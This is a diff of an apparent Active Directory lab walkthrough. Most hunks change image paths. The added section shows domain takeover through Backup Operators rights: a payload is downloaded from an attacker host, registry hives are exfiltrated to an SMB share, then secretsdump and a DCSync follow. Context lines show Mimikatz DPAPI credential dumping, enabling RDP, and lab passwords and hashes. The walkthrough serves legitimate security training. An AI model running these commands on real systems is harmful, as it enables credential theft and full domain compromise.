-![](<../../../../.gitbook/assets/image (14).png>)
+![](<../../../.gitbook/assets/image (14).png>)
 
 ### 11. Dumping DPAPI
 
@@ -777,7 +777,7 @@ $WebClient.DownloadFile("http://192.168.248.2:8090/Seatbelt.exe","C:\users\publi
 
 2\. In the output of the section WindowsCredentialFiles we can see that the user `sa_sql` has some credentials saved:
 
-![](<../../../../.gitbook/assets/image (17).png>)
+![](<../../../.gitbook/assets/image (17).png>)
 
 4\. We can find the master encryption key id and some information about the saved credentials with the following Mimikatz command using the previous path and FileName:
 
@@ -791,7 +791,7 @@ $WebClient.DownloadFile("http://192.168.248.2:8090/mimikatz.exe","C:\users\publi
 The latest compiled version of Mimikatz doesn't work on server 2022. Compiling the latest commit with Visual Studio 2019 gave me some errors, but this [https://github.com/matrix/mimikatz/tree/type\_cast-pointer\_truncation\_x64](https://github.com/matrix/mimikatz/tree/type\_cast-pointer\_truncation\_x64) repostorie/pull request worked for me without errors! I really hate compiling tools like this, always errors :cry:
 {% endhint %}
 
-![](<../../../../.gitbook/assets/image (20).png>)
+![](<../../../.gitbook/assets/image (20).png>)
 
 The `pbData` field contains the encrypted data and the `guidMasterKey` contains the GUID of the key needed to decrypt it.
 
@@ -803,7 +803,7 @@ The `pbData` field contains the encrypted data and the `guidMasterKey` contains 
 
 For some reason I kept getting errors, even If I gained a shell as `sa_sql` through crackmapexec. We already owned the machine so maybe we could just RDP into it. But RDP is disabled:
 
-![](<../../../../.gitbook/assets/image (35).png>)
+![](<../../../.gitbook/assets/image (35).png>)
 
 We could always just enable RDP with the following commands:
 
@@ -819,11 +819,11 @@ net localgroup administrators sa_sql /add
 net localgroup "Remote Desktop Users" sa_sql /add
 ```
 
-![](<../../../../.gitbook/assets/image (13).png>)
+![](<../../../.gitbook/assets/image (13).png>)
 
 If we scan with Nmap now port 3389 is open:
 
-![](<../../../../.gitbook/assets/image (45).png>)
+![](<../../../.gitbook/assets/image (45).png>)
 
 We now can RDP into the machine with for example Xfreerdp:
 
@@ -837,7 +837,7 @@ If we now run the same Mimikatz.exe command we receive the masterkey:
 ./mimikatz.exe "dpapi::masterkey /in:C:\Users\sa_sql\AppData\Roaming\Microsoft\Protect\S-1-5-21-1498997062-1091976085-892328878-1106\e1f462bb-9a65-40f0-a144-4f64bea97ce2 /sid:S-1-5-21-1498997062-1091976085-892328878-1106 /password:Iloveyou2 /protected" "exit"
 ```
 
-![](<../../../../.gitbook/assets/image (62).png>)
+![](<../../../.gitbook/assets/image (62).png>)
 
 7\. Now we can read the saved credentials with the masterkey using the following Mimikatz command:
 
@@ -845,7 +845,7 @@ If we now run the same Mimikatz.exe command we receive the masterkey:
 ./mimikatz.exe "dpapi::cred /in:C:\Users\sa_sql\AppData\Roaming\Microsoft\Credentials\02BF8752741C7A447536E822E53153CD /masterkey:b3e8630e96acba990f836b4462a9285a4c987776f17f11b2559d9fdf67d03cf6b99dd89445d5641aef6f4477f7354eb6f19e3053e1d56712f45bc227249cdea2" "exit"
 ```
 
-![](<../../../../.gitbook/assets/image (63).png>)
+![](<../../../.gitbook/assets/image (63).png>)
 
 We recived a credentials for the `sa_backup` user, the password is `LS6RV5o8T9`. We can quickly check if this is correct with Crackmapexec:
 
@@ -853,7 +853,7 @@ We recived a credentials for the `sa_backup` user, the password is `LS6RV5o8T9`.
 crackmapexec smb 10.0.0.100 -u sa_backup -p LS6RV5o8T9
 ```
 
-![](<../../../../.gitbook/assets/image (46).png>)
+![](<../../../.gitbook/assets/image (46).png>)
 
 The login is succesfull, so the password is correct. The last thing to do is to remove the tools we placed on the machine and we should disable RDP again to not leave any changes to the system.
 
@@ -866,7 +866,47 @@ netsh advfirewall firewall set rule group="remote desktop" new enable=No
 
 **Task: Become domain admin by abusing the "Backup Operators" group.**
 
+1. When we look at the user `sa_backup` we see that he is a member of multiple high privileged groups, such as `Server Operators`, `Account Operators` and `Backup Operators`. In this section we will abuse the last group to become `Domain Admin`. This group can read files on the domain controller.
+2. To execute the **** [BackupOperatorToDA](https://github.com/mpgn/BackupOperatorToDA) tool which is able to dump the sam using these privileges we need to host our own public smb share. we can do this with the smbserver.py script from Impacket. This will create a share on `\\192.168.248.2\share`.
 
+```
+mkdir ~/adlab/share
+python3 /opt/impacket/examples/smbserver.py share ~/adlab/share -smb2support
+```
+
+![](<../../../.gitbook/assets/image (27).png>)
+
+3\. The next step is to execute the BackupOperatorToDa tool to retrieve the the SAM, SYSTEN and SECURITY HIVE and save them in our created public share. But first we have to download it on `DATA01` in the shell:
+
+```
+$WebClient = New-Object System.Net.WebClient
+$WebClient.DownloadFile("http://192.168.248.2:8090/BackupOperatorToDA.exe","C:\users\public\BackupOperatorToDA.exe") 
+.\BackupOperatorToDA.exe -t \\dc03.secure.local -u sa_backup -p LS6RV5o8T9 -d secure.local -o \\192.168.248.2\share\
+```
+
+4\. After a couple of minutes when we share the directory `~/adlab/share` we see that the files `SAM`, `SYSTEM` and `SECURITY` are there.
+
+![](<../../../.gitbook/assets/image (41).png>)
+
+5\. The next step is to run [SecretDump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) from Impacket to retrieve the machine account NTLM hash out of these HIVE dumps:
+
+```
+secretsdump.py LOCAL -system ~/adlab/share/SYSTEM -security ~/adlab/share/SECURITY -sam ~/adlab/share/SAM
+```
+
+![](<../../../.gitbook/assets/image (18).png>)
+
+6\. The last step is to run Secretsdump.py to run DCsync and retrieve all the domain account hashes using the computeraccount:
+
+```
+secretsdump.py 'secure.local/dc03$'@dc03.secure.local -hashes aad3b435b51404eeaad3b435b51404ee:ba6414d4e6ce546465b256950282c7f3
+```
+
+![](<../../../.gitbook/assets/image (57).png>)
+
+7\. We retrieved the Administrator hash and can authenticate as `Domain Admin` to the Domain Controller `DC03` of `Secure.local`.
+
+![](<../../../.gitbook/assets/image (69).png>)
 
 ### 13. Kerberoast
 
